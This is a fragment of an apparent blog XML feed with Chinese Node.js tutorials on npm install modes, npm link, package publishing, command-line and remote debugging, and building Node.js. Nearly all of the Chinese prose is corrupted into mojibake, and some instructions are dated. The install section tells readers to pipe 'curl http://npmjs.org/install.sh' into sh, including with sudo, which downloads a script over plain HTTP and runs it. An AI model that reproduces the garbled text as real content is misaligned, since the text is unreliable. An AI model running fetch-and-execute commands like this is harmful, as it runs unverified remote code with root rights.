"gnutls": ["1.0", "2.0"], "openssl": "0.9.8" &#125; &#125;&#125; Node.js åŒ…ç®¡ç†å™¨Node.jsåŒ…ç®¡ç†å™¨ï¼Œå³ npm æ˜¯ Node.js å®˜æ–¹æä¾›çš„åŒ…ç®¡ç†å·¥å…·ï¼Œå®ƒå·²ç»æˆäº† Node.js åŒ…çš„æ ‡å‡†å‘å¸ƒå¹³å°ï¼Œç”¨äºŽ Node.js åŒ…çš„å‘å¸ƒã€ä¼ æ’­ã€ä¾èµ–æŽ§åˆ¶ã€‚npm æä¾›äº†å‘½ä»¤è¡Œå·¥å…·ï¼Œä½¿ä½ å¯ä»¥æ–¹ä¾¿åœ°ä¸‹è½½ã€å®‰è£…ã€å‡çº§ã€åˆ é™¤åŒ…ï¼Œä¹Ÿå¯ä»¥è®©ä½ ä½œä¸ºå¼€å‘è€…å‘å¸ƒå¹¶ç»´æŠ¤åŒ…ã€‚ èŽ·å–ä¸€ä¸ªåŒ…ä½¿ç”¨ npm å®‰è£…åŒ…çš„å‘½ä»¤æ ¼å¼ä¸ºï¼š npm [install/i][package_name] ä¾‹å¦‚ä½ è¦å®‰è£… express ï¼Œå¯ä»¥åœ¨å‘½ä»¤è¡Œè¿è¡Œï¼š $ npm install express æˆ–è€…ï¼š $ npm i express express å®‰è£…æˆåŠŸä¹‹åŽè¢«æ”¾ç½®åœ¨å½“å‰ç›®å½•çš„ node_modules å­ç›®å½•ä¸‹ã€‚npm åœ¨èŽ·å– express çš„æ—¶å€™è¿˜å°†è‡ªåŠ¨è§£æžå…¶ä¾èµ–ï¼Œå¹¶èŽ·å– express ä¾èµ–çš„ mime ã€ mkdirp ã€qs å’Œ connect ã€‚ æœ¬åœ°æ¨¡å¼å’Œå…¨å±€æ¨¡å¼npm åœ¨é»˜è®¤æƒ…å†µä¸‹ä¼šä»Žhttp://npmjs.orgæœç´¢æˆ–ä¸‹è½½åŒ…ï¼Œå°†åŒ…å®‰è£…åˆ°å½“å‰ç›®å½•çš„ node_modules å­ç›®å½•ä¸‹ã€‚ åœ¨ä½¿ç”¨ npm å®‰è£…åŒ…çš„æ—¶å€™ï¼Œæœ‰ä¸¤ç§æ¨¡å¼ï¼šæœ¬åœ°æ¨¡å¼å’Œå…¨å±€æ¨¡å¼ã€‚é»˜è®¤æƒ…å†µä¸‹æˆ‘ä»¬ä½¿ç”¨ npm install å‘½ä»¤å°±æ˜¯é‡‡ç”¨æœ¬åœ°æ¨¡å¼ï¼Œå³æŠŠåŒ…å®‰è£…åˆ°å½“å‰ç›®å½•çš„ node_modules å­ç›®å½•ä¸‹ã€‚Node.js çš„ require åœ¨åŠ è½½æ¨¡å—æ—¶ä¼šå°è¯•æœå¯» node_modules å­ç›®å½•ï¼Œå› æ­¤ä½¿ç”¨ npm æœ¬åœ°æ¨¡å¼å®‰è£…çš„åŒ…å¯ä»¥ç›´æŽ¥è¢«å¼•ç”¨ã€‚ npm è¿˜æœ‰å¦ä¸€ç§ä¸åŒçš„å®‰è£…æ¨¡å¼è¢«æˆä¸ºå…¨å±€æ¨¡å¼ï¼Œä½¿ç”¨æ–¹æ³•ä¸ºï¼š npm [install/i] -g [package_name] ä¸Žæœ¬åœ°æ¨¡å¼çš„ä¸åŒä¹‹å¤„å°±åœ¨äºŽå¤šäº†ä¸€ä¸ªå‚æ•° -g ã€‚ ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å…¨å±€æ¨¡å¼å‘¢ï¼Ÿå¤šæ•°æ—¶å€™å¹¶ä¸æ˜¯å› ä¸ºè®¸å¤šç¨‹åºéƒ½æœ‰å¯èƒ½ç”¨åˆ°å®ƒï¼Œä¸ºäº†å‡å°‘å¤šé‡å‰¯æœ¬è€Œä½¿ç”¨å…¨å±€æ¨¡å¼ï¼Œè€Œæ˜¯å› ä¸ºæœ¬åœ°æ¨¡å¼ä¸ä¼šæ³¨å†Œ PATH çŽ¯å¢ƒå˜é‡ã€‚ æˆ‘ä»¬å®‰è£… supervisor æ˜¯ä¸ºäº†åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œå®ƒï¼Œå‡å¦‚ç›´æŽ¥è¿è¡Œ supervisor script.jsï¼Œè¿™æ—¶å°±éœ€è¦åœ¨ PATH çŽ¯å¢ƒå˜é‡ä¸­æ³¨å†Œ supervisorã€‚npm æœ¬åœ°æ¨¡å¼ä»…ä»…æ˜¯æŠŠåŒ…å®‰è£…åˆ° node_modules å­ç›®å½•ä¸‹ï¼Œå…¶ä¸­çš„ bin ç›®å½•æ²¡æœ‰åŒ…å«åœ¨ PATH çŽ¯å¢ƒå˜é‡ä¸­ï¼Œä¸èƒ½ç›´æŽ¥åœ¨å‘½ä»¤è¡Œä¸­è°ƒç”¨ã€‚è€Œå½“ä½¿ç”¨å…¨å±€æ¨¡å¼å®‰è£…æ—¶ï¼Œnpm ä¼šå°†åŒ…å®‰è£…åˆ°ç³»ç»Ÿç›®å½•ï¼Œè­¬å¦‚/usr/local/lib/node_modules/ï¼ŒåŒæ—¶ package.json æ–‡ä»¶ä¸­ bin å­—æ®µåŒ…å«çš„æ–‡ä»¶ä¼šè¢«é“¾æŽ¥åˆ° /usr/local/bin/ã€‚/usr/local/bin/ æ˜¯åœ¨ PATH çŽ¯å¢ƒå˜é‡ä¸­é»˜è®¤å®šä¹‰çš„ï¼Œå› æ­¤å°±å¯ä»¥ç›´æŽ¥åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ supervisor script.js å‘½ä»¤äº†ã€‚ ä½¿ç”¨å…¨å±€æ¨¡å¼å®‰è£…çš„åŒ…å¹¶ä¸èƒ½ç›´æŽ¥åœ¨ JavaScript æ–‡ä»¶ä¸­ç”¨ require èŽ·å¾—ï¼Œå› ä¸º require ä¸ä¼šæœç´¢ /usr/local/lib/node_modules/ã€‚ æœ¬åœ°æ¨¡å¼å’Œå…¨å±€æ¨¡å¼çš„ç‰¹ç‚¹ æ¨¡å¼ å¯é€šè¿‡ require ä½¿ç”¨ æ³¨å†Œ PATH æœ¬åœ°æ¨¡å¼ æ˜¯ å¦ å…¨å±€æ¨¡å¼ å¦ æ˜¯ æ€»è€Œè¨€ä¹‹ï¼Œè¦æŠŠæŸä¸ªåŒ…ä½œä¸ºå·¥ç¨‹è¿è¡Œæ—¶çš„ä¸€éƒ¨åˆ†æ—¶ï¼Œé€šè¿‡æœ¬åœ°æ¨¡å¼èŽ·å–ï¼Œå¦‚æžœè¦åœ¨å‘½ä»¤è¡Œä¸‹ä½¿ç”¨ï¼Œåˆ™ä½¿ç”¨å…¨å±€æ¨¡å¼å®‰è£…ã€‚ åˆ›å»ºå…¨å±€é“¾æŽ¥npm æä¾›äº†ä¸€ä¸ªæœ‰è¶£çš„å‘½ä»¤ npm linkï¼Œ å®ƒçš„åŠŸèƒ½æ˜¯åœ¨æœ¬åœ°åŒ…å’Œå…¨å±€åŒ…ä¹‹é—´åˆ›å»ºç¬¦å·é“¾æŽ¥ã€‚ä½¿ç”¨å…¨å±€æ¨¡å¼å®‰è£…çš„åŒ…ä¸èƒ½ç›´æŽ¥é€šè¿‡ require ä½¿ç”¨ï¼Œä½†é€šè¿‡ npm link å‘½ä»¤å¯ä»¥æ‰“ç ´è¿™ä¸€é™åˆ¶ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å·²ç»é€šè¿‡ npm install -g express å®‰è£…äº† express ï¼Œè¿™æ—¶åœ¨å·¥ç¨‹çš„ç›®å½•ä¸‹è¿è¡Œå‘½ä»¤ï¼š 12$ npm link express./node_modules/express -&gt; /usr/local/lib/node_modules/express å¯ä»¥åœ¨ node_modules å­ç›®å½•ä¸­å‘çŽ°ä¸€ä¸ªæŒ‡å‘å®‰è£…åˆ°å…¨å±€çš„åŒ…çš„ç¬¦å·é“¾æŽ¥ã€‚é€šè¿‡è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠå…¨å±€åŒ…å½“æœ¬åœ°åŒ…æ¥ä½¿ç”¨äº†ã€‚(npm link å‘½ä»¤ä¸æ”¯æŒ Windowsã€‚) åŒ…çš„å‘å¸ƒnpm å¯ä»¥éžå¸¸æ–¹ä¾¿åœ°å‘å¸ƒä¸€ä¸ªåŒ…ï¼Œæ¯” pipã€gemã€pear è¦ç®€å•å¾—å¤šã€‚åœ¨å‘å¸ƒä¹‹å‰ï¼Œé¦–å…ˆéœ€è¦è®©æˆ‘ä»¬çš„åŒ…ç¬¦åˆ npm çš„è§„èŒƒï¼Œnpm æœ‰ä¸€å¥—ä»¥ CommonJS ä¸ºåŸºç¡€åŒ…è§„èŒƒï¼Œä½†ä¸Ž CommonJSå¹¶ä¸å®Œå…¨ä¸€è‡´ï¼Œå…¶ä¸»è¦å·®åˆ«åœ¨äºŽå¿…å¡«å­—æ®µçš„ä¸åŒã€‚é€šè¿‡ä½¿ç”¨ npm init å¯ä»¥æ ¹æ®äº¤äº’å¼é—®ç­”äº§ç”Ÿä¸€ä¸ªç¬¦åˆæ ‡å‡†çš„ package.jsonï¼Œä¾‹å¦‚åˆ›å»ºä¸€ä¸ªåä¸º byvoidmodule çš„ç›®å½•ï¼Œç„¶åŽåœ¨è¿™ä¸ªç›®å½•ä¸­è¿è¡Œ npm init ï¼š 1234567891011121314151617181920212223242526272829$ npm initPackage name: (byvoidmodule) byvoidmoduleDescription: A modulefor learning perpose.Package version: (0.0 .0) 0.0 .1Project homepage: (none) http: //www.byvoid.com/Project git repository: (none)Author name: BYVoidAuthor email: (none) byvoid.kcp @gmail.comAuthor url: (none) http: //www.byvoid.com/Main module / entry point: (none)Test command: (none)What versions of node does it run on ? (~0.6 .10)About to write to / home / byvoid / byvoidmodule / package.json &#123;"author": "BYVoid &lt;byvoid.kcp@gmail.com&gt; (http://www.byvoid.com/)","name": "byvoidmodule","description": "A module for learning perpose.","version": "0.0.1","homepage": "http://www.byvoid.com/","repository": &#123; "url": ""&#125;,"engines": &#123; "node": "~0.6.12"&#125;,"dependencies": &#123;&#125;,"devDependencies": &#123;&#125;&#125;Is this ok ? (yes) yes è¿™æ ·å°±åœ¨ byvoidmodule ç›®å½•ä¸­ç”Ÿæˆä¸€ä¸ªç¬¦åˆ npm è§„èŒƒçš„ package.json æ–‡ä»¶ã€‚åˆ›å»ºä¸€ä¸ªindex.js ä½œä¸ºåŒ…çš„æŽ¥å£ï¼Œä¸€ä¸ªç®€å•çš„åŒ…å°±åˆ¶ä½œå®Œæˆäº†ã€‚åœ¨å‘å¸ƒå‰ï¼Œæˆ‘ä»¬è¿˜éœ€è¦èŽ·å¾—ä¸€ä¸ªè´¦å·ç”¨äºŽä»ŠåŽç»´æŠ¤è‡ªå·±çš„åŒ…ï¼Œä½¿ç”¨ npm adduser æ ¹æ®æç¤ºè¾“å…¥ç”¨æˆ·åã€å¯†ç ã€é‚®ç®±ï¼Œç­‰å¾…è´¦å·åˆ›å»ºå®Œæˆã€‚å®ŒæˆåŽå¯ä»¥ä½¿ç”¨ npm whoami æµ‹éªŒæ˜¯å¦å·²ç»å–å¾—äº†è´¦å·ã€‚ æŽ¥ä¸‹æ¥ï¼Œåœ¨ package.json æ‰€åœ¨ç›®å½•ä¸‹è¿è¡Œ npm publish ï¼Œç¨ç­‰ç‰‡åˆ»å°±å¯ä»¥å®Œæˆå‘å¸ƒäº†ã€‚æ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—® http://search.npmjs.org/ å°±å¯ä»¥æ‰¾åˆ°è‡ªå·±åˆšåˆšå‘å¸ƒçš„åŒ…äº†ã€‚çŽ°åœ¨æˆ‘ä»¬å¯ä»¥åœ¨è®¡ç®—æœºä¸Šä½¿ç”¨ npm install byvoidmodule å‘½ä»¤æ¥å®‰è£…å®ƒã€‚ å¦‚æžœä½ çš„åŒ…å°†æ¥æœ‰æ›´æ–°ï¼Œåªéœ€è¦åœ¨ package.json æ–‡ä»¶ä¸­ä¿®æ”¹ version å­—æ®µï¼Œç„¶åŽé‡æ–°ä½¿ç”¨ npm publish å‘½ä»¤å°±è¡Œäº†ã€‚å¦‚æžœä½ å¯¹å·²å‘å¸ƒçš„åŒ…ä¸æ»¡æ„ï¼ˆæ¯”å¦‚æˆ‘ä»¬å‘å¸ƒçš„è¿™ä¸ªæ¯«æ— æ„ä¹‰çš„åŒ…ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ npm unpublish å‘½ä»¤æ¥å–æ¶ˆå‘å¸ƒã€‚ è°ƒè¯•å†™ç¨‹åºæ—¶å…ä¸äº†é‡åˆ° bugï¼Œè€Œå½“ bug å‘ç”Ÿä»¥åŽï¼Œé™¤äº†æŠ“è€³æŒ è…®ä¹‹å¤–ï¼Œä¸€ä¸ªå¸¸ç”¨çš„æŠ€æœ¯æ˜¯å•æ­¥è°ƒè¯•ã€‚Node.js çš„è°ƒè¯•åŠŸèƒ½æ­£æ˜¯ç”± V8 æä¾›çš„ï¼Œä¿æŒäº†ä¸€è´¯çš„é«˜æ•ˆå’Œæ–¹ä¾¿çš„ç‰¹æ€§ã€‚ é‚£ä¹ˆå¦‚ä½•ä½¿ç”¨ Node.js å†…ç½®çš„å·¥å…·å’Œç¬¬ä¸‰æ–¹æ¨¡å—æ¥è¿›è¡Œå•æ­¥è°ƒè¯•ï¼Ÿ å‘½ä»¤è¡Œè°ƒè¯•12345678// debug.jsvar a = 1;var b = 'world';var c = function(x) &#123; console.log('hello ' + x + a);&#125;;c(b); åœ¨å‘½ä»¤è¡Œä¸‹æ‰§è¡Œ node debug debug.js ï¼Œå°†ä¼šå¯åŠ¨è°ƒè¯•å·¥å…·ï¼š 1234567891011C:\Users\Administrator\Desktop&gt;node debug debug.js(node:12120) [DEP0068] DeprecationWarning: `node debug` is deprecated. Please use `node inspect` instead.&lt; Debugger listening on ws://127.0.0.1:9229/7df244e0-68fc-4469-8e55-fdff7dbbb0ed&lt; For help see https://nodejs.org/en/docs/inspectorBreak on start in debug.js:1&gt; 1 (function (exports, require, module, __filename, __dirname) &#123; var a = 1; 2 var b = 'world'; 3 var c = function(x) &#123;debug&gt; è¿™æ ·å°±æ‰“å¼€äº†ä¸€ä¸ª Node.js çš„è°ƒè¯•ç»ˆç«¯ï¼Œç”¨ä¸€äº›åŸºæœ¬çš„å‘½ä»¤è¿›è¡Œå•æ­¥è·Ÿè¸ªè°ƒè¯•. å‘½ ä»¤ åŠŸ èƒ½ run æ‰§è¡Œè„šæœ¬ï¼Œåœ¨ç¬¬ä¸€è¡Œæš‚åœ restart é‡æ–°æ‰§è¡Œè„šæœ¬ cont, c ç»§ç»­æ‰§è¡Œï¼Œç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹ next, n å•æ­¥æ‰§è¡Œ step, s å•æ­¥æ‰§è¡Œå¹¶è¿›å…¥å‡½æ•° out, o ä»Žå‡½æ•°ä¸­æ­¥å‡º setBreakpoint(), sb() åœ¨å½“å‰è¡Œè®¾ç½®æ–­ç‚¹ setBreakpoint(â€˜f()â€™), sb(â€¦) åœ¨å‡½æ•°fçš„ç¬¬ä¸€è¡Œè®¾ç½®æ–­ç‚¹ setBreakpoint(â€˜script.jsâ€™, 20), sb(â€¦) åœ¨ script.js çš„ç¬¬20è¡Œè®¾ç½®æ–­ç‚¹ setBreakpoint(â€˜script.jsâ€™, 20), sb(â€¦) æ˜¾ç¤ºå½“å‰æ‰§è¡Œåˆ°çš„å‰åŽ5è¡Œä»£ç  clearBreakpoint, cb(â€¦) æ˜¾ç¤ºå½“å‰æ‰§è¡Œåˆ°çš„å‰åŽ5è¡Œä»£ç  backtrace, bt æ˜¾ç¤ºå½“å‰æ‰§è¡Œåˆ°çš„å‰åŽ5è¡Œä»£ç  list(5) æ˜¾ç¤ºå½“å‰æ‰§è¡Œåˆ°çš„å‰åŽ5è¡Œä»£ç  watch(expr) æŠŠè¡¨è¾¾å¼ expr åŠ å…¥ç›‘è§†åˆ—è¡¨ unwatch(expr) æŠŠè¡¨è¾¾å¼ expr ä»Žç›‘è§†åˆ—è¡¨ç§»é™¤ watchers æ˜¾ç¤ºç›‘è§†åˆ—è¡¨ä¸­æ‰€æœ‰çš„è¡¨è¾¾å¼å’Œå€¼ repl åœ¨å½“å‰ä¸Šä¸‹æ–‡æ‰“å¼€å³æ—¶æ±‚å€¼çŽ¯å¢ƒ kill ç»ˆæ­¢å½“å‰æ‰§è¡Œçš„è„šæœ¬ scripts æ˜¾ç¤ºå½“å‰å·²åŠ è½½çš„æ‰€æœ‰è„šæœ¬ version æ˜¾ç¤º V8 çš„ç‰ˆæœ¬ ä¸‹é¢æ˜¯ç®€å•çš„å®žä¾‹ 1234567891011121314151617181920212223242526272829303132333435363738394041C:\Users\Administrator\Desktop&gt;node debug debug.js(node:30052) [DEP0068] DeprecationWarning: `node debug` is deprecated. Please use `node inspect` instead.&lt; Debugger listening on ws://127.0.0.1:9229/faddd156-7d49-4731-85c5-562a3b718eb7&lt; For help see https://nodejs.org/en/docs/inspectorBreak on start in debug.js:1&gt; 1 (function (exports, require, module, __filename, __dirname) &#123; var a = 1; 2 var b = 'world'; 3 var c = function(x) &#123;debug&gt; nbreak in debug.js:1&gt; 1 (function (exports, require, module, __filename, __dirname) &#123; var a = 1; 2 var b = 'world'; 3 var c = function(x) &#123;debug&gt; sb('debug.js',4) 1 (function (exports, require, module, __filename, __dirname) &#123; var a = 1; 2 var b = 'world'; 3 var c = function(x) &#123;&gt; 4 console.log('hello ' + x + a); 5 &#125;; 6 c(b); 7 &#125;);debug&gt; cbreak in debug.js:4 2 var b = 'world'; 3 var c = function(x) &#123;&gt; 4 console.log('hello ' + x + a); 5 &#125;; 6 c(b);debug&gt; replPress Ctrl + C to leave debug repl&gt; x'world'&gt; a + 12debug&gt; c&lt; hello world1&lt; Debugger attached.&lt; Waiting for the debugger to disconnect...debug&gt; è¿œç¨‹è°ƒè¯•V8 æä¾›çš„è°ƒè¯•åŠŸèƒ½æ˜¯åŸºäºŽ TCP åè®®çš„ï¼Œå› æ­¤ Node.js å¯ä»¥è½»æ¾åœ°å®žçŽ°è¿œç¨‹è°ƒè¯•ã€‚åœ¨å‘½ä»¤è¡Œä¸‹ä½¿ç”¨ä»¥ä¸‹ä¸¤ä¸ªè¯­å¥ä¹‹ä¸€å¯ä»¥æ‰“å¼€è°ƒè¯•æœåŠ¡å™¨ï¼š 12node --debug [= port ] script.jsnode --debug-brk [= port ] script.js node â€“debug å‘½ä»¤é€‰é¡¹å¯ä»¥å¯åŠ¨è°ƒè¯•æœåŠ¡å™¨ï¼Œé»˜è®¤æƒ…å†µä¸‹è°ƒè¯•ç«¯å£æ˜¯ 5858ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ â€“debug=1234 æŒ‡å®šè°ƒè¯•ç«¯å£ä¸º 1234ã€‚ä½¿ç”¨ â€“debug é€‰é¡¹è¿è¡Œè„šæœ¬æ—¶ï¼Œè„šæœ¬ä¼šæ­£å¸¸æ‰§è¡Œï¼Œä½†ä¸ä¼šæš‚åœï¼Œåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è°ƒè¯•å®¢æˆ·ç«¯å¯ä»¥è¿žæŽ¥åˆ°è°ƒè¯•æœåŠ¡å™¨ã€‚å¦‚æžœè¦æ±‚è„šæœ¬æš‚åœæ‰§è¡Œç­‰å¾…å®¢æˆ·ç«¯è¿žæŽ¥ï¼Œåˆ™åº”è¯¥ä½¿ç”¨ â€“debug-brk é€‰é¡¹ã€‚è¿™æ—¶è°ƒè¯•æœåŠ¡å™¨åœ¨å¯åŠ¨åŽä¼šç«‹åˆ»æš‚åœæ‰§è¡Œè„šæœ¬ï¼Œç­‰å¾…è°ƒè¯•å®¢æˆ·ç«¯è¿žæŽ¥ã€‚å½“è°ƒè¯•æœåŠ¡å™¨å¯åŠ¨ä»¥åŽï¼Œå¯ä»¥ç”¨å‘½ä»¤è¡Œè°ƒè¯•å·¥å…·ä½œä¸ºè°ƒè¯•å®¢æˆ·ç«¯è¿žæŽ¥ï¼Œä¾‹å¦‚ï¼š 12345678910111213//åœ¨ä¸€ä¸ªç»ˆç«¯ä¸­$ node --debug-brk debug.jsdebugger listening on port 5858//åœ¨å¦ä¸€ä¸ªç»ˆç«¯ä¸­$ node debug 127.0.0.1:5858connecting... okdebug&gt; nbreak in /home/byvoid/debug.js:2 1 var a = 1; 2 var b = 'world'; 3 var c = function (x) &#123; 4 console.log('hello ' + x + a);debug&gt; ä½¿ç”¨ node-inspector è°ƒè¯• Node.jså¤§éƒ¨åˆ†åŸºäºŽ Node.js çš„åº”ç”¨éƒ½æ˜¯è¿è¡Œåœ¨æµè§ˆå™¨ä¸­çš„ï¼Œä¾‹å¦‚å¼ºå¤§çš„è°ƒè¯•å·¥å…· node-inspectorã€‚node-inspector æ˜¯ä¸€ä¸ªå®Œå…¨åŸºäºŽ Node.js çš„å¼€æºåœ¨çº¿è°ƒè¯•å·¥å…·ï¼Œæä¾›äº†å¼ºå¤§çš„è°ƒè¯•åŠŸèƒ½å’Œå‹å¥½çš„ç”¨æˆ·ç•Œé¢ï¼Œå®ƒçš„ä½¿ç”¨æ–¹æ³•ååˆ†ç®€ä¾¿ã€‚é¦–å…ˆï¼Œä½¿ç”¨ npm install -g node-inspector å‘½ä»¤å®‰è£… node-inspectorï¼Œç„¶åŽåœ¨ç»ˆç«¯ä¸­é€šè¿‡ node â€“debug-brk=5858 debug.js å‘½ä»¤è¿žæŽ¥ä½ è¦é™¤é”™çš„è„šæœ¬çš„è°ƒè¯•æœåŠ¡å™¨ï¼Œå¯åŠ¨ node-inspectorï¼š $ node-inspector åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ http://127.0.0.1:8080/debug?port=5858 ï¼Œ å³å¯æ˜¾ç¤ºå‡ºä¼˜é›…çš„ Web è°ƒè¯•å·¥å…·.node-inspector çš„ä½¿ç”¨æ–¹æ³•ååˆ†ç®€å•ï¼Œå’Œæµè§ˆå™¨è„šæœ¬è°ƒè¯•å·¥å…·ä¸€æ ·ï¼Œæ”¯æŒå•æ­¥ã€æ–­ç‚¹ã€è°ƒç”¨æ ˆå¸§æŸ¥çœ‹ç­‰åŠŸèƒ½ã€‚ï¼ˆnode-inspector ä½¿ç”¨äº† WebKit Web Inspectorï¼Œå› æ­¤åªèƒ½åœ¨ Chromeã€Safariç­‰ WebKit å†…æ ¸çš„æµè§ˆå™¨ä¸­ä½¿ç”¨ï¼Œè€Œä¸æ”¯æŒ Firefox æˆ– Internet Explorerã€‚ï¼‰]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¥½çŽ©çš„Nodejs â€”â€” å®‰è£…å’Œé…ç½® Node.js]]></title>
    <url>%2F2018-09-13-NodeJs-Part2.html</url>
    <content type="text"><![CDATA[å®‰è£…å’Œé…ç½® Node.jsä¸‹è½½å®‰è£…è¿˜æ˜¯æŒºç®€å•çš„ï¼Œç‚¹å‡»NodeJsï¼Œæ‰¾åˆ°download å’Œ ä¸Žè®¡ç®—æœºå¯¹åº”çš„æ“ä½œç³»ç»Ÿè¿›è¡Œä¸‹è½½å®‰è£…å³å¯ã€‚ ç¼–è¯‘æºä»£ç Node.js ä»Ž 0.6 ç‰ˆæœ¬å¼€å§‹å·²ç»å®žçŽ°äº†æºä»£ç çº§åˆ«çš„è·¨å¹³å°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸åŒçš„ç¼–è¯‘å‘½ä»¤å°†åŒä¸€ä»½æºä»£ç çš„åŸºç¡€ä¸Šç¼–è¯‘ä¸ºä¸åŒå¹³å°ä¸‹çš„åŽŸç”Ÿå¯æ‰§è¡Œä»£ç ã€‚åœ¨ç¼–è¯‘ä¹‹å‰ï¼Œè¦å…ˆèŽ·å–æºç åŒ…ã€‚å»ºè®®è®¿é—®http://nodejs.orgï¼Œç‚¹å‡»Downloadé“¾æŽ¥ï¼Œç„¶åŽé€‰æ‹©Source Codeï¼Œä¸‹è½½æ­£å¼å‘å¸ƒçš„æºç åŒ…ã€‚å¦‚æžœä½ éœ€è¦å¼€å‘ä¸­çš„ç‰ˆæœ¬ï¼Œå¯ä»¥é€šè¿‡https://github.com/joyent/node/zipball/master èŽ·å¾—ï¼Œæˆ–è€…åœ¨å‘½ä»¤è¡Œä¸‹è¾“å…¥ git clone git://github.com/joyent/node.git ä»ŽgitèŽ·å¾—æœ€æ–°çš„åˆ†æ”¯ã€‚ åœ¨ Windowsç³»ç»Ÿä¸­ç¼–è¯‘Node.js åœ¨ Windows ä¸‹åªèƒ½é€šè¿‡ Microsoft Visual Studio ç¼–è¯‘ï¼Œå› æ­¤ä½ éœ€è¦é¦–å…ˆå®‰è£… VisualStudio æˆ–è€…å…è´¹çš„ Visual Studio Expressã€‚ä½ è¿˜éœ€è¦å®‰è£… Python 2ï¼ˆ2.5ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œä½†è¦å°äºŽ3.0ï¼‰ï¼Œå¯ä»¥åœ¨http://python.org/å–å¾—ã€‚å®‰è£…å®Œ Python ä»¥åŽè¯·ç¡®ä¿åœ¨ PATH çŽ¯å¢ƒå˜é‡ä¸­æ·»åŠ python.exe æ‰€åœ¨çš„ç›®å½•ï¼Œå¦‚æžœæ²¡æœ‰åˆ™éœ€è¦æ‰‹åŠ¨åœ¨â€œç³»ç»Ÿå±žæ€§â€ä¸­æ·»åŠ ã€‚ä¸€åˆ‡å‡†å¤‡å¥½ä»¥åŽï¼Œæ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼Œè¿›å…¥ Node.js æºä»£ç æ‰€åœ¨çš„ç›®å½•è¿›è¡Œç¼–è¯‘ï¼š C:\Users\byvoid\node-v0.6.12&gt;vcbuild.bat release[â€˜-fâ€™, â€˜msvsâ€™, â€˜-Gâ€™, â€˜msvs_version=2010â€™, â€˜.\node.gypâ€™, â€˜-Iâ€™, â€˜.\common.gypiâ€™, â€˜â€“depth=.â€™,â€™-Dtarget_Project files generated. C:\Program Files (x86)\MSBuild\Microsoft.Cpp\v4.0\Microsoft.CppBuild.targets(1151,5):warning MSB8012: http_parser.vcxproj -&gt; C:\Users\byvoid\node-v0.6.12\Release\http_parser.libjs2c, and also js2c_experimental node_js2câ€¦ ç›´æŽ¥è¿è¡Œ node.exe å³å¯è¿›å…¥ Node.js çš„äº¤äº’æ¨¡å¼ï¼Œåœ¨ç³»ç»Ÿ PATH çŽ¯å¢ƒå˜é‡ä¸­æ·»åŠ node.exeæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ node å‘½ä»¤äº†ï¼Œå‰©ä¸‹çš„å·¥ä½œå°±æ˜¯æ‰‹åŠ¨å®‰è£… npm äº†ã€‚ å®‰è£… Node åŒ…ç®¡ç†å™¨Node åŒ…ç®¡ç†å™¨ï¼ˆnpmï¼‰æ˜¯ä¸€ä¸ªç”± Node.js å®˜æ–¹æä¾›çš„ç¬¬ä¸‰æ–¹åŒ…ç®¡ç†å·¥å…·.npm æ˜¯ä¸€ä¸ªå®Œå…¨ç”± JavaScript å®žçŽ°çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œé€šè¿‡ Node.js æ‰§è¡Œï¼Œå› æ­¤ä¸¥æ ¼æ¥è®²å®ƒä¸å±žäºŽ Node.js çš„ä¸€éƒ¨åˆ†ã€‚æˆ‘ä»¬åœ¨ Windowsã€Mac ä¸Šå®‰è£…åŒ…å’Œæºä»£ç åŒ…æ—¶ä¼šè‡ªåŠ¨åŒæ—¶å®‰è£… npmã€‚ http://npmjs.org/æä¾›äº† npm å‡ ç§ä¸åŒçš„å®‰è£…æ–¹æ³•ï¼Œé€šå¸¸ä½ åªéœ€è¦æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š curl http://npmjs.org/install.sh | sh å¦‚æžœå®‰è£…è¿‡ç¨‹ä¸­å‡ºçŽ°äº†æƒé™é—®é¢˜ï¼Œé‚£ä¹ˆéœ€è¦åœ¨ root æƒé™ä¸‹æ‰§è¡Œä¸Šé¢çš„è¯­å¥ï¼Œæˆ–è€…ä½¿ç”¨ sudo ã€‚ curl http://npmjs.org/install.sh | sudo sh å…¶ä»–å®‰è£…æ–¹æ³•ï¼Œè­¬å¦‚ä»Ž git ä¸­èŽ·å– npm çš„æœ€æ–°åˆ†æ”¯ï¼Œå¯ä»¥å‚è€ƒ http://npmjs.org/doc/README.htmlä¸Šçš„è¯´æ˜Žã€‚ å¦å¤–è¿˜å¯ä»¥ä¸Šèœé¸Ÿç¼–ç¨‹æŸ¥çœ‹å®‰è£…é…ç½®æ–¹æ³•ï¼Œç®€å•æ˜Žäº†ã€‚]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¥½çŽ©çš„Nodejs â€”â€” ç®€ä»‹]]></title>
    <url>%2F2018-09-13-NodeJs-Part1.html</url>
